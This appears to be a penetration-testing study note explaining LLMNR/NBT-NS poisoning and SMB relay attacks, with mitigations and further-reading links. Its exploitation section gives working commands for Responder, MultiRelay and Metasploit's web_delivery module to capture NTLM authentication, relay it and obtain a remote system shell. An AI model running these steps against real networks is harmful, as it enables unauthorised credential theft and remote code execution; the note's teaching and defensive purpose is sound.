# Relay attacks
---
# Navigation
- **[[#Whats LLMNR]]**
- **[[#SMB Relay attack]]**
- **[[#Mitigations]]**
- **[[#Further reading]]**
---
## Whats LLMNR?
**Link-Local Multicast Name Resolution (LLMNR)** and **NetBIOS Name Service (NBT-NS)** are Microsoft Windows components that serve as alternate methods of host identification. **LLMNR is based upon the Domain Name System (DNS) format** and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.
But this method of host resolution has severe security impact, as when a non-existing host is searched using LLMNR method, it **broadcasts** the search request to every system connected to the local network. As a result, **if any of the systems in local network is somehow compromised by an attacker, it also receives the host search query and can send a response to the victim** (the system which initiated the host resolution query) that it knows the host **and in turn ask for the password hash of the victim**.

![[LLMNR.png]]
# SMB relay attack
## Definition
SMB signing is a security mechanism that allows digitally signing SMB packets to enforce their authenticity and integrity - the client/server knows that the incoming SMB packets they are receiving are coming from a trusted source and that they have not been tampered with while in transit, preventing man in the middle type attacks.
Instead of cracking the NTLM hashes taken from the LLMNR poisoning attack or any other method we can authenticate using the hash using SMB relay attack but this requires two conditions:
- The victim user must be a local admin.
- SMB signing must be disabled.
## Checking if SMB signing id disabled
```bash 
nmap -p 445 -sS --script smb-security-mode.nse <Target-IP>
```
## Exploitation
1. Turn off the SMB and HTTP servers by changing ‘On’ to ‘Off’.
```bash
nano /usr/share/responder/Responder.conf
```
2. Run Responder.
```bash
responder -I <Interface> -rv
#-I (capital i specifies interface) -rv (required settings for relay attack)
```
3. Boot up Multi-Relay and wait.
```bash
cd /usr/share/responder/tools
python MultiRelay.py -t <Targete-IP> -u ALL
```
4. Post-exploitation
Shut off responder and let's get a system shell
```bash
msfconsole
use exploit/multi/script/web_delivery
show targets #Then select 'PSH' (Powershell)
run
```
5. Take the command from metsaploit and execute it in the multirelay shell.
## Mitigations
1. Disable LLMNR and NetBIOS in local security settings or by group policy this can be done by running the following powershell command to change the registry to disbale llmnr and netbios.
```powershell
New-Item "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT" -Name DNSClient  -Force
New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMultiCast -Value 0 -PropertyType DWORD  -Force
```
2.  Enabling SMB signing can stop NTLMv2 relay attacks (note that this will increase traffic because of the additional processing for each packet) and also some printers may not support SMB singing. To turn on SMB signing you can do so through group policy by enabling “Microsoft network client: Digitally sign communication (always)”
3.  Network segmentation is another way in which this can be mitigated because then the man in the middle attack is limited in scope. This can be achieved by segmenting the network through Vlans.

# Further reading
1. [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
2.   [https://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7bef](https://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7bef)
3.   [https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks](https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)
4.   [https://www.ired.team/offensive-security/lateral-movement/lateral-movement-via-smb-relaying-by-abusing-lack-of-smb-signing](https://www.ired.team/offensive-security/lateral-movement/lateral-movement-via-smb-relaying-by-abusing-lack-of-smb-signing)